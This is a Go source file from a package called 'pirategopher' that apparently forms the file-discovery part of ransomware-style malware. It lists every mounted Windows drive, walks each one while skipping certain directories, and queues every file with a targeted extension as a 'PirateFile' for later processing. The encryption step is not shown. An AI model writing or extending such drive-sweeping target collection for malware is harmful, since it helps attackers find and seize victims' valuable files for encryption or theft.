package pirategopher

import (
	"crypto/rand"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
)

// Check if a value exists on slice
func stringInSlice(search string, slice []string) bool {
	for _, v := range slice {
		if v == search {
			return true
		}
	}
	return false
}

func generateRandomHexString(size int) (string, error) {
	h := make([]byte, size)
	_, err := rand.Read(h)
	if err != nil {
		return "", err
	}

	return hex.EncodeToString(h)[:size], nil
}

func getDrives() (drives []string) {
	for _, letter := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drive := string(letter) + ":\\"
		_, err := os.Stat(drive)
		if err == nil {
			drives = append(drives, drive)
		}
	}
	return drives
}

func walkDrive(path string, f os.FileInfo, err error) error {
	if f.IsDir() {
		for _, skipDir := range SkippedDirs {
			if strings.Contains(filepath.Base(path), skipDir) {
				return filepath.SkipDir
			}
		}
	} else {
		ext := strings.ToLower(filepath.Ext(path))
		if len(ext) >= 2 && stringInSlice(ext[1:], InterestingExtensions) {
			fileTracker.Files <- &PirateFile{
				FileInfo: f,
				Extension: ext[1:],
				FullPath: path,
			}
		}
	}
	return nil
}

func walkDrives(dirs []string) {
	for _, dir := range dirs {
		filepath.Walk(dir, walkDrive)
	}
	close(fileTracker.Files)
}